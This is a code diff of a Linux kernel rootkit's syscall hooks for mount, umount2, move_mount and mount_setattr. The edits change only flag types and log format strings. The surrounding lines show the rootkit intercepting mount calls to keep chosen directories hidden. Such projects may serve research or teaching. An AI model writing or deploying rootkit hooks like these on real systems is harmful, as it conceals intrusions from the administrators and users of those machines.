@@ -17,10 +17,10 @@
 
 // sys_mount syscall hook handler
 SYSCALL_HOOK_HANDLER5(mount, orig_mount, p_regs, char __user *, s_dev_name, char __user *,
-                      s_dir_name, char __user *, s_type, unsigned long, ui32_flags, void __user *,
+                      s_dir_name, char __user *, s_type, unsigned long, ui64_flags, void __user *,
                       p_data)
 {
-    pr_info("[ROOTKIT] mount(%p, %p, %p, %lu, %p)\n", s_dev_name, s_dir_name, s_type, ui32_flags,
+    pr_info("[ROOTKIT] mount(%p, %p, %p, %#lx, %p)\n", s_dev_name, s_dir_name, s_type, ui64_flags,
             p_data);
 
     // Check if the target directory is hidden
@@ -34,7 +34,7 @@ SYSCALL_HOOK_HANDLER5(mount, orig_mount, p_regs, char __user *, s_dev_name, char
 // sys_umount2 syscall hook handler
 SYSCALL_HOOK_HANDLER2(umount2, orig_umount2, p_regs, char __user *, s_name, int, i32_flags)
 {
-    pr_info("[ROOTKIT] umount2(%p, %d)\n", s_name, i32_flags);
+    pr_info("[ROOTKIT] umount2(%p, %s%#x)\n", s_name, SIGNED_ARG(i32_flags));
 
     IF_U (i32_flags & ~(MNT_FORCE | MNT_DETACH | MNT_EXPIRE | UMOUNT_NOFOLLOW)) {
         return -EINVAL;
@@ -49,7 +49,7 @@ SYSCALL_HOOK_HANDLER5(move_mount, orig_move_mount, p_regs, int, i32_from_dfd, ch
                       s_from_pathname, int, i32_to_dfd, char __user *, s_to_pathname, unsigned int,
                       ui32_flags)
 {
-    pr_info("[ROOTKIT] move_mount(%d, %p, %d, %p, %x)\n", i32_from_dfd, s_from_pathname, i32_to_dfd,
+    pr_info("[ROOTKIT] move_mount(%d, %p, %d, %p, %#x)\n", i32_from_dfd, s_from_pathname, i32_to_dfd,
             s_to_pathname, ui32_flags);
 
     IF_U (ui32_flags & ~MOVE_MOUNT__MASK) {
@@ -86,7 +86,7 @@ SYSCALL_HOOK_HANDLER5(mount_setattr, orig_mount_setattr, p_regs, int, i32_dfd, c
     int i_err;
     struct mount_attr attr;
 
-    pr_info("[ROOTKIT] mount_setattr(%d, %p, %x, %p, %zu)\n", i32_dfd, s_path, ui32_flags, p_uattr,
+    pr_info("[ROOTKIT] mount_setattr(%d, %p, %#x, %p, %zu)\n", i32_dfd, s_path, ui32_flags, p_uattr,
             sz_usize);
 
     // Use same checks as in fs/namespace.c:4269
